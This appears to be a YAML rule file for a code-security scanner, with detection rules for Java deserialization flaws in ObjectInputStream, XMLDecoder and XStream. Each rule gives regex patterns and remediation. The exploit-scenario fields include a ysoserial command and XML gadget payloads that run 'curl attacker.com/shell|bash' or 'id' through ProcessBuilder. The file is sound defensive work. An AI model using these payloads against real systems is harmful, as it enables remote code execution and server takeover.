rules:
  # ============================================================================
  # DESER-JAVA-001: ObjectInputStream.readObject
  # ============================================================================
  - rule_id: "DESER-JAVA-001"
    title: "ObjectInputStream.readObject on Untrusted Data Leading to RCE"
    description: >
      Detects usage of Java's ObjectInputStream.readObject() or
      readUnshared() on data from untrusted sources. Java's native
      serialization mechanism allows arbitrary object reconstruction
      including invocation of readObject, readResolve, and finalize
      methods on deserialized objects. Well-known gadget chains in
      common libraries (Commons Collections, Spring, Hibernate) enable
      arbitrary code execution through crafted serialized Java objects.
      This is the most exploited Java deserialization vulnerability class.
    language: java
    category: deserialization
    severity: Critical
    confidence: 0.95
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - java
      - objectinputstream
      - rce
      - gadget-chain
      - critical
      - ysoserial
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'new\s+ObjectInputStream\s*\(\s*(request\.|socket\.|conn\.|input|stream|data|payload)'
        description: "ObjectInputStream created from untrusted input stream"
      - type: regex
        pattern: '\.readObject\s*\(\s*\)'
        description: "readObject call on ObjectInputStream"
      - type: regex
        pattern: '\.readUnshared\s*\(\s*\)'
        description: "readUnshared call which also triggers deserialization"
      - type: regex
        pattern: 'new\s+ObjectInputStream\s*\(\s*new\s+ByteArrayInputStream\s*\('
        description: "ObjectInputStream wrapping ByteArrayInputStream"
      - type: regex
        pattern: 'ObjectInputStream\s*\(\s*new\s+BufferedInputStream\s*\(\s*(socket|conn|request)\.'
        description: "Buffered ObjectInputStream from network source"
      - type: regex
        pattern: 'ObjectInputStream\s+\w+\s*=\s*new\s+ObjectInputStream'
        description: "ObjectInputStream variable declaration and instantiation"
      - type: regex
        pattern: '(getInputStream|getReader)\s*\(\s*\).*ObjectInputStream'
        description: "ObjectInputStream from servlet or socket input stream"
      - type: regex
        pattern: 'SerializationUtils\.deserialize\s*\('
        description: "Apache Commons SerializationUtils.deserialize helper"
    anti_patterns:
      - 'ObjectInputFilter|setObjectInputFilter|REJECTED'
      - 'resolveClass\s*\(\s*ObjectStreamClass.*throw'
      - 'ValidatingObjectInputStream'
      - 'LookAheadObjectInputStream'
      - 'SerialKiller'
      - 'NotSerializableException'
      - 'readObject.*test|Test.*readObject'
      - '@Test.*readObject'
      - 'mock.*ObjectInputStream'
      - 'ObjectInputStream\s*\(\s*new\s+FileInputStream\s*\(\s*"(config|settings|internal)'
      - 'whitelistedClasses|allowedClasses'
      - 'ClassNameValidator'
      - 'ObjectInputStream\s*\(\s*getResourceAsStream'
      - 'ObjectInputStream.*hmac|mac\.verify'
      - 'ObjectInputStream.*signature\.verify'
    bypass_variants:
      - description: "Custom ObjectInputStream without resolveClass filtering"
        pattern: 'extends\s+ObjectInputStream\s*\{(?!.*resolveClass.*throw)'
      - description: "Using Unsafe.allocateInstance to bypass constructor checks"
        pattern: 'Unsafe\.getUnsafe\s*\(\s*\)\.allocateInstance'
      - description: "Wrapping deserialization in privileged action"
        pattern: 'AccessController\.doPrivileged.*readObject'
    evasion_indicators:
      - "Custom ObjectInputStream subclass without class filtering"
      - "Base64-encoded serialized Java object"
      - "Serialized object in HTTP header or cookie"
      - "Java serialization magic bytes (0xACED) in request"
      - "ysoserial gadget chain payloads"
    encoding_variants:
      - type: "base64"
        pattern: 'Base64\.(getDecoder|decode)\s*\(\s*\)\.decode\s*\(.*ObjectInputStream'
      - type: "hex"
        pattern: 'Hex\.decode\s*\(.*ObjectInputStream'
      - type: "gzip"
        pattern: 'GZIPInputStream\s*\(.*ObjectInputStream'
    multi_function_chain_patterns:
      - "HTTP request -> Base64 decode -> ObjectInputStream -> readObject -> RCE"
      - "RMI call -> ObjectInputStream -> gadget chain -> code execution"
      - "JMS message -> ObjectMessage.getObject -> deserialization -> RCE"
      - "Socket input -> ObjectInputStream -> readObject -> command execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Java deserialization gadget chains in classpath libraries enable arbitrary code execution with the JVM process privileges"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HttpServletRequest.getInputStream()"
        sink: "ObjectInputStream.readObject()"
        through: "ByteArrayInputStream or BufferedInputStream"
      - source: "Socket.getInputStream()"
        sink: "ObjectInputStream.readObject()"
        through: "Direct stream wrapping"
      - source: "JMS ObjectMessage"
        sink: "ObjectMessage.getObject()"
        through: "JMS consumer deserialization"
    impact: |
      Java ObjectInputStream deserialization of untrusted data leads to:
      - Arbitrary Remote Code Execution via gadget chains (ysoserial)
      - Full server compromise with JVM process privileges
      - Data exfiltration from databases and file systems
      - Lateral movement within the network
      - Persistent backdoor installation
      - Denial of Service through resource-intensive object graphs
    remediation: |
      1. Use ObjectInputFilter (Java 9+) to whitelist allowed classes:
         ```java
         ObjectInputStream ois = new ObjectInputStream(inputStream);
         ois.setObjectInputFilter(filterInfo -> {
             if (filterInfo.serialClass() != null) {
                 String className = filterInfo.serialClass().getName();
                 if (ALLOWED_CLASSES.contains(className)) {
                     return ObjectInputFilter.Status.ALLOWED;
                 }
                 return ObjectInputFilter.Status.REJECTED;
             }
             return ObjectInputFilter.Status.UNDECIDED;
         });
         ```
      2. Use Apache Commons IO ValidatingObjectInputStream:
         ```java
         ValidatingObjectInputStream vois = new ValidatingObjectInputStream(inputStream);
         vois.accept(SafeClass1.class, SafeClass2.class);
         Object obj = vois.readObject();
         ```
      3. Replace Java serialization with JSON (Jackson/Gson) for external APIs.
      4. Remove unnecessary gadget chain libraries from classpath.
      5. Implement network-level controls to block serialized Java objects.
    references:
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://github.com/frohoff/ysoserial"
      - "https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"
    context_awareness:
      surrounding_context_patterns:
        - "ObjectInputStream instantiation in same method"
        - "readObject call on instance"
        - "No ObjectInputFilter configuration"
        - "No resolveClass override with whitelist"
      taint_source_indicators:
        - "request.getInputStream()"
        - "socket.getInputStream()"
        - "JMS message"
        - "RMI invocation"
        - "HTTP request body"
        - "Cookie value"
      taint_sink_indicators:
        - "ObjectInputStream.readObject()"
        - "ObjectInputStream.readUnshared()"
        - "SerializationUtils.deserialize()"
        - "ObjectMessage.getObject()"
      sanitization_patterns:
        - "ObjectInputFilter with whitelist"
        - "ValidatingObjectInputStream"
        - "resolveClass override with class name check"
        - "SerialKiller library"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (gadget_chain_present ? 1.5 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Java web application accepts serialized Java objects via an API
        endpoint for legacy integration. The servlet reads the request body
        into an ObjectInputStream and calls readObject(). The application
        has Apache Commons Collections 3.2.1 on the classpath. An attacker
        generates a ysoserial CommonsCollections1 payload:
        java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell|bash'
        The attacker sends this as the POST body. readObject() triggers the
        gadget chain, invoking Runtime.exec with the attacker's command.
      example_payload: "ysoserial CommonsCollections1 'touch /tmp/pwned'"
      attacker_objective: "Execute arbitrary OS commands via Java deserialization gadget chains to compromise the server"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "DESER-JAVA-002"
        - "DESER-JAVA-003"
        - "DESER-JAVA-004"
        - "DESER-JAVA-005"

  # ============================================================================
  # DESER-JAVA-002: XMLDecoder.readObject
  # ============================================================================
  - rule_id: "DESER-JAVA-002"
    title: "XMLDecoder.readObject Deserialization Leading to Code Execution"
    description: >
      Detects usage of java.beans.XMLDecoder to deserialize XML data from
      untrusted sources. XMLDecoder can instantiate arbitrary Java objects,
      call methods, and set properties as defined in the XML input. Unlike
      ObjectInputStream, XMLDecoder uses a human-readable XML format which
      makes it easier to craft and understand payloads. Attackers can
      construct XML that invokes ProcessBuilder or Runtime.exec to execute
      arbitrary commands. This vulnerability class has been exploited in
      critical CVEs including the Oracle WebLogic Server vulnerabilities.
    language: java
    category: deserialization
    severity: Critical
    confidence: 0.94
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - java
      - xmldecoder
      - rce
      - weblogic
      - critical
      - xml
    detection_layer: 1
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'new\s+XMLDecoder\s*\(\s*(request\.|socket\.|conn\.|input|stream|data|payload)'
        description: "XMLDecoder created from untrusted input stream"
      - type: regex
        pattern: 'XMLDecoder\s*\(\s*new\s+ByteArrayInputStream\s*\('
        description: "XMLDecoder wrapping ByteArrayInputStream with potentially untrusted data"
      - type: regex
        pattern: 'XMLDecoder\s*\(\s*new\s+BufferedInputStream\s*\(\s*(request|socket|conn)\.'
        description: "XMLDecoder from buffered network stream"
      - type: regex
        pattern: '\.readObject\s*\(\s*\).*XMLDecoder'
        description: "readObject call on XMLDecoder instance"
      - type: regex
        pattern: 'XMLDecoder\s+\w+\s*=\s*new\s+XMLDecoder'
        description: "XMLDecoder variable declaration"
      - type: regex
        pattern: 'XMLDecoder\s*\(\s*getClass\s*\(\s*\)\.getResourceAsStream\s*\(\s*(request\.|param|input)'
        description: "XMLDecoder from resource stream with user-controlled path"
    anti_patterns:
      - 'XMLDecoder\s*\(\s*new\s+FileInputStream\s*\(\s*"(config|settings|internal)'
      - 'XMLDecoder.*test|Test.*XMLDecoder'
      - '@Test.*XMLDecoder'
      - 'mock.*XMLDecoder'
      - 'XMLDecoder\s*\(\s*getClass\s*\(\s*\)\.getResourceAsStream\s*\(\s*"/'
      - 'XMLDecoder.*validate'
      - 'XMLDecoder.*schema'
      - 'XMLDecoder.*whitelist'
      - 'XMLDecoder.*sandbox'
      - 'XMLDecoder.*trusted'
      - '#.*deprecated.*XMLDecoder'
      - 'XMLDecoder.*internal'
      - 'XMLDecoder.*fixture'
    bypass_variants:
      - description: "XMLDecoder payload invoking ProcessBuilder"
        pattern: '<object\s+class\s*=\s*"java\.lang\.ProcessBuilder"'
      - description: "XMLDecoder payload using Runtime.exec"
        pattern: '<void\s+method\s*=\s*"exec"'
      - description: "XMLDecoder with nested object construction for chain execution"
        pattern: '<object\s+class\s*=\s*"java\.lang\.Runtime".*<void\s+method'
    evasion_indicators:
      - "XML with java.beans tags in HTTP request body"
      - "Content-Type: application/xml with object/void tags"
      - "ProcessBuilder or Runtime references in XML"
      - "Base64-encoded XML payload"
      - "CDATA sections wrapping malicious class names"
    encoding_variants:
      - type: "base64_xml"
        pattern: 'Base64\.(getDecoder|decode).*XMLDecoder'
      - type: "gzip_xml"
        pattern: 'GZIPInputStream.*XMLDecoder'
      - type: "cdata_obfuscation"
        pattern: '<!\[CDATA\[.*ProcessBuilder.*\]\]>'
    multi_function_chain_patterns:
      - "HTTP POST -> XML body -> XMLDecoder -> ProcessBuilder -> command execution"
      - "File upload -> XML content -> XMLDecoder -> Runtime.exec -> RCE"
      - "SOAP request -> XML body -> XMLDecoder -> arbitrary object creation"
      - "WebLogic WLS endpoint -> XMLDecoder -> code execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "XMLDecoder reconstructs arbitrary Java objects from XML, enabling direct ProcessBuilder/Runtime.exec invocation for OS command execution"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HTTP request body (XML)"
        sink: "XMLDecoder.readObject()"
        through: "ByteArrayInputStream wrapping"
      - source: "SOAP request body"
        sink: "XMLDecoder.readObject()"
        through: "XML parsing pipeline"
      - source: "Uploaded XML file"
        sink: "XMLDecoder.readObject()"
        through: "FileInputStream"
    impact: |
      XMLDecoder deserialization of untrusted XML leads to:
      - Direct Remote Code Execution via ProcessBuilder or Runtime.exec
      - Arbitrary object instantiation and method invocation
      - File system read/write through crafted object construction
      - Denial of Service through resource-intensive object graphs
      - Full server compromise (as seen in WebLogic CVE-2017-10271)
    remediation: |
      1. Never use XMLDecoder with untrusted input:
         ```java
         // Bad: XMLDecoder on user input
         XMLDecoder decoder = new XMLDecoder(request.getInputStream());

         // Good: Use Jackson or JAXB with schema validation
         ObjectMapper mapper = new ObjectMapper();
         MyDTO dto = mapper.readValue(request.getInputStream(), MyDTO.class);
         ```
      2. Replace XMLDecoder with JAXB for XML deserialization:
         ```java
         JAXBContext context = JAXBContext.newInstance(MyClass.class);
         Unmarshaller unmarshaller = context.createUnmarshaller();
         MyClass obj = (MyClass) unmarshaller.unmarshal(inputStream);
         ```
      3. If XMLDecoder must be used, implement a SecurityManager to restrict operations.
      4. Apply WAF rules to block XML containing java.beans tags.
      5. Remove XMLDecoder usage from internet-facing endpoints entirely.
    references:
      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://www.oracle.com/security-alerts/cpujan2018.html"
    context_awareness:
      surrounding_context_patterns:
        - "XMLDecoder instantiation with external input"
        - "readObject call on XMLDecoder"
        - "No XML content validation before decoding"
        - "Servlet or controller handling XML input"
      taint_source_indicators:
        - "request.getInputStream()"
        - "request.getReader()"
        - "SOAP message body"
        - "uploaded XML file"
        - "HTTP POST body"
      taint_sink_indicators:
        - "XMLDecoder.readObject()"
        - "XMLDecoder constructor"
      sanitization_patterns:
        - "XML schema validation before XMLDecoder"
        - "Content-type restriction"
        - "WAF rules for java.beans XML tags"
        - "SecurityManager restrictions"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (internet_facing ? 1.5 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A WebLogic server exposes a WLS-WSAT endpoint that processes XML
        input using XMLDecoder. An attacker sends a POST request containing:
        <java version="1.8.0" class="java.beans.XMLDecoder">
          <object class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0"><string>/bin/bash</string></void>
              <void index="1"><string>-c</string></void>
              <void index="2"><string>curl attacker.com/shell|bash</string></void>
            </array>
            <void method="start"/>
          </object>
        </java>
        XMLDecoder instantiates ProcessBuilder and invokes start(),
        executing the attacker's reverse shell command.
      example_payload: '<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></java>'
      attacker_objective: "Execute OS commands through XMLDecoder by constructing ProcessBuilder objects in XML"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "DESER-JAVA-001"
        - "DESER-JAVA-003"
        - "DESER-JAVA-008"

  # ============================================================================
  # DESER-JAVA-003: XStream fromXML
  # ============================================================================
  - rule_id: "DESER-JAVA-003"
    title: "XStream fromXML Deserialization Enabling Remote Code Execution"
    description: >
      Detects usage of XStream's fromXML method on untrusted input without
      proper security configuration. XStream is a widely-used XML/JSON
      serialization library for Java that can reconstruct arbitrary object
      graphs from XML. Without explicit security configuration (allowTypes,
      denyTypes, or setupDefaultSecurity), XStream allows deserialization
      of any class on the classpath, enabling gadget chain attacks similar
      to those exploitable via ObjectInputStream. Multiple CVEs demonstrate
      RCE through XStream including CVE-2021-21344 through CVE-2021-21351.
    language: java
    category: deserialization
    severity: Critical
    confidence: 0.93
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - java
      - xstream
      - rce
      - xml
      - gadget-chain
      - critical
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'xstream\.fromXML\s*\(\s*(request\.|socket\.|input|stream|data|payload|body|xml|content)'
        description: "XStream.fromXML on untrusted input"
      - type: regex
        pattern: 'new\s+XStream\s*\(\s*\)\s*;(?!.*setupDefaultSecurity|allowTypes|denyPermission)'
        description: "XStream instantiation without security configuration"
      - type: regex
        pattern: 'xstream\.fromXML\s*\(\s*new\s+String(Reader|InputStream)\s*\('
        description: "XStream.fromXML from reader/stream wrapping user data"
      - type: regex
        pattern: 'XStream\s+\w+\s*=\s*new\s+XStream\s*\(\s*(new\s+DomDriver|new\s+StaxDriver|new\s+JettisonMappedXmlDriver)'
        description: "XStream with various drivers without security setup"
      - type: regex
        pattern: 'xstream\.fromXML\s*\(\s*String\.valueOf\s*\('
        description: "XStream.fromXML after String conversion"
      - type: regex
        pattern: 'XStream\.NO_REFERENCES'
        description: "XStream configured without reference handling (potential bypass)"
    anti_patterns:
      - 'xstream\.setupDefaultSecurity'
      - 'xstream\.allowTypes'
      - 'xstream\.denyPermission'
      - 'xstream\.addPermission\s*\(\s*NoTypePermission'
      - 'xstream\.allowTypesByWildcard'
      - 'XStream.*test|Test.*XStream'
      - '@Test.*xstream'
      - 'mock.*XStream'
      - 'xstream\.fromXML\s*\(\s*"<'
      - 'xstream\.fromXML\s*\(\s*getResourceAsStream'
      - 'xstream\.(setClassLoader|setSecurityManager)'
      - 'xstream\.fromXML.*schema'
      - 'xstream.*trusted'
      - 'xstream.*internal'
    bypass_variants:
      - description: "XStream EventHandler gadget chain for RCE"
        pattern: '<java\.beans\.EventHandler>|<dynamic-proxy>'
      - description: "XStream with custom converter bypassing type restrictions"
        pattern: 'xstream\.registerConverter\s*\(\s*new\s+\w+Converter'
      - description: "Sorted-set or tree-map based gadget chains"
        pattern: '<sorted-set>|<tree-map>.*<comparator.*class='
    evasion_indicators:
      - "XML with XStream-specific type aliases"
      - "Dynamic proxy elements in XStream XML"
      - "EventHandler references in XML payload"
      - "Custom converter that bypasses type restrictions"
      - "XStream version < 1.4.18 without security hardening"
    encoding_variants:
      - type: "base64"
        pattern: 'Base64\.decode.*xstream\.fromXML'
      - type: "gzip"
        pattern: 'GZIPInputStream.*xstream\.fromXML'
      - type: "json_xstream"
        pattern: 'JettisonMappedXmlDriver|JsonHierarchicalStreamDriver'
    multi_function_chain_patterns:
      - "REST endpoint -> XML body -> XStream.fromXML -> gadget chain -> RCE"
      - "SOAP service -> XML -> XStream -> object construction -> command execution"
      - "File upload -> XML content -> XStream.fromXML -> code execution"
      - "Message queue -> XML payload -> XStream -> deserialization -> RCE"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "XStream without security configuration allows instantiation of any classpath class, enabling gadget chain attacks with full server access"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "HTTP request body (XML/JSON)"
        sink: "XStream.fromXML()"
        through: "Direct string or stream parameter"
      - source: "File upload content"
        sink: "XStream.fromXML()"
        through: "File read to string"
      - source: "Message queue XML message"
        sink: "XStream.fromXML()"
        through: "Consumer callback"
    impact: |
      Unrestricted XStream deserialization can lead to:
      - Remote Code Execution via multiple known gadget chains
      - Server-Side Request Forgery through URL-based gadgets
      - Arbitrary file read/write
      - Denial of Service through recursive XML structures
      - Complete server compromise
    remediation: |
      1. Configure XStream security (v1.4.7+):
         ```java
         XStream xstream = new XStream();
         xstream.addPermission(NoTypePermission.NONE);
         xstream.addPermission(NullPermission.NULL);
         xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
         xstream.allowTypes(new Class[] { SafeClass.class });
         ```
      2. Use setupDefaultSecurity (v1.4.10+):
         ```java
         XStream xstream = new XStream();
         XStream.setupDefaultSecurity(xstream);
         xstream.allowTypes(new Class[] { SafeClass.class });
         ```
      3. Upgrade to XStream 1.4.18+ which has stricter defaults.
      4. Replace XStream with Jackson or JAXB for XML processing.
      5. Implement WAF rules to detect XStream gadget chain payloads.
    references:
      - "https://x-stream.github.io/security.html"
      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21344"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "XStream import and instantiation in same file"
        - "No setupDefaultSecurity or allowTypes call"
        - "fromXML with user-controlled parameter"
        - "No type permission configuration"
      taint_source_indicators:
        - "request.getInputStream()"
        - "request.getParameter()"
        - "request.getReader()"
        - "uploaded file content"
        - "external URL response"
      taint_sink_indicators:
        - "xstream.fromXML()"
        - "xstream.unmarshal()"
      sanitization_patterns:
        - "setupDefaultSecurity()"
        - "addPermission(NoTypePermission.NONE)"
        - "allowTypes with explicit class list"
        - "denyPermission for dangerous packages"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (security_configured ? 0.3 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A REST API uses XStream to deserialize XML requests. The XStream
        instance is created with new XStream() without security configuration.
        An attacker sends an XML payload containing a dynamic-proxy element
        that chains through EventHandler to invoke Runtime.exec:
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
              <command><string>curl</string><string>attacker.com/shell</string></command>
            </target>
            <action>start</action>
          </handler>
        </dynamic-proxy>
      example_payload: "<dynamic-proxy><interface>java.lang.Comparable</interface><handler class='java.beans.EventHandler'><target class='java.lang.ProcessBuilder'><command><string>id</string></command></target><action>start</action></handler></dynamic-proxy>"
      attacker_objective: "Exploit XStream's unrestricted type instantiation to execute commands via gadget chains"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
